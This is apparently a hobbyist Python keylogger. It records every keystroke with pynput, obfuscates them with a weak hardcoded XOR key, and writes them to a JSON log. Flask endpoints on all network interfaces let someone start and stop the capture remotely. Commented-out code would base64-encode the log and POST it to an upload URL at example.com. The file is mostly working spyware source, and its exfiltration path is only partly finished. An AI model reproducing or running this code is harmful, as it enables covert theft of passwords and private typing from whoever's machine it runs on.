import base64
from datetime import datetime
import threading
from threading import Thread
from pynput import keyboard
import time
import json
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

ENCRYPTED_LOG_FILE = "encrypted_logs.json"
ENCRYPTION_KEY = "613".encode('utf-8')


# url = "https://example.com/upload"
#
# @app.route('/get_file', methods=['GET'])
# def upload_file():
#     with open("encrypted_logs.txt", "rb") as f:
#         encoded_content = base64.b64encode(f.read()).decode("utf-8")
#     data = {"filename": "encrypted_logs.txt", "content": encoded_content}
#     headers = {"Content-Type": "application/json"}
#     response = requests.post(url, json=data, headers=headers)
#     print(response.text)
#     return 'Data received', 200

@app.route('/start', methods=['GET'])
def start():
    Manager().start_logging()
    return "KeyLogger started listening", 200


@app.route('/stop', methods=['GET'])
def stop():
    Manager().stop_logging()
    return "KeyLogger stopped listening", 200


@app.route('/time_to_run/<value>', methods=['GET'])
def time_to_run(value):
    if int(value) > 0:
        Manager().run_time(int(value))
        return f"KeyLogger started listening for {value} minutes", 200
    else:
        return "No runtime received.", 200


class JSONFileHandler:
    @staticmethod
    def read_logs():
        try:
            with open(ENCRYPTED_LOG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {"logs": []}

    @staticmethod
    def write_log(encrypted_content: str):
        logs = JSONFileHandler.read_logs()
        log_entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M"),
            "encrypted_content": encrypted_content
        }
        logs["logs"].append(log_entry)
        with open(ENCRYPTED_LOG_FILE, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=4)


class KeyLogger:
    def __init__(self, routing: str = 'file'):
        self.routing = routing
        self.current_keys = []
        self.lock = threading.Lock()
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.stop_event = False

    def start(self, time_to_run: int = 0):
        self.listener.start()
        print("Starting listening!")
        if time_to_run <= 0:
            while not self.stop_event:
                time.sleep(60)
                self.save_and_clear()
        else:
            for _ in range(time_to_run):
                time.sleep(60)
                self.save_and_clear()
            self.listener.stop()
            return

    def on_press(self, key):
        with self.lock:
            try:
                key_str = self.format_key(key)
                if key_str:
                    self.current_keys.append(key_str)
            except Exception as e:
                print(f"Error handling key: {e}")

    def format_key(self, key):
        """Format special keys and characters."""
        if key == keyboard.Key.space:
            return ' '
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        return f"[{key.name}]"

    def save_and_clear(self):
        keys_copy = []
        with self.lock:
            keys_copy = self.current_keys.copy()
            self.current_keys.clear()
        keys_str = ''.join(keys_copy)
        Manager.encrypt(keys_str)
        # save for letter
        # if keys_copy:
        #     if self.routing == 'file':
        #         Writer().add_writing(keys_copy)
        #     elif self.routing == 'server':
        #         Writer().write_to_server()

    def stop_listen(self):
        self.listener.stop()
        self.stop_event = True

    def routing_to_save(self, route):
        if route == 'server':
            self.routing = route


#
# class FileWriter:
#     @classmethod
#     def add_writing(cls, encrypted_content: str):
#         log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
#         with open(ENCRYPTED_LOG_FILE, "a", encoding="utf-8") as f:
#             f.write(f"[{log_time}] {encrypted_content}\n")
#
#     @classmethod
#     def write_to_server(cls):
#         pass
#
#     @classmethod
#     def read(cls):
#         with open(ENCRYPTED_LOG_FILE,'br',)


class EncryptorDecryptor:
    @staticmethod
    def encrypt(data: str) -> str:
        """Encrypt data using XOR cipher and return base64 string."""
        data_bytes = data.encode('utf-8')
        encrypted = bytes([(data_bytes[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]) for i in range(len(data_bytes))])
        return base64.b64encode(encrypted).decode('utf-8')

    @staticmethod
    def decrypt(encrypted_b64: str) -> str:
        """Decrypt base64 encoded encrypted string."""
        try:
            encrypted_data = base64.b64decode(encrypted_b64)
            decrypted = bytes(
                [(encrypted_data[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]) for i in range(len(encrypted_data))])
            return decrypted.decode('utf-8')
        except Exception as e:
            print(f"Decryption error: {e}")
            return ""


class Manager:
    def __init__(self):
        self.key_logger = KeyLogger()
        self.threading_start = threading.Thread(target=self.thread_start_logging)
        self.threading_run_time = None

    def stop_logging(self):
        self.key_logger.stop_listen()

    def start_logging(self):
        if not self.threading_start.is_alive():
            self.threading_start.start()

    def thread_start_logging(self):
        self.key_logger.start()  # returns on a

    def run_time(self, timer: int):
        self.threading_run_time = threading.Thread(target=self.thread_run_time, args=(timer,))
        self.threading_run_time.start()

    def thread_run_time(self, timer: int):
        self.key_logger.start(timer)

    @staticmethod
    def encrypt(data: str):
        encrypted_data = EncryptorDecryptor.encrypt(data)
        JSONFileHandler.write_log(encrypted_data)

    @staticmethod
    def decrypt_log_file():
        logs = JSONFileHandler.read_logs()
        for log in logs["logs"]:
            decrypted = EncryptorDecryptor.decrypt(log["encrypted_content"])
            print(f"{log['timestamp']} {decrypted}")

    def route(self, routing='file'):
        self.key_logger.routing_to_save(routing)


if __name__ == '__main__':
    Manager.decrypt_log_file()
    app.run(host='0.0.0.0', port=5000)

    # m = Manager()
    # m.run_time(1)

    # m.stop()
    Manager.decrypt_log_file()
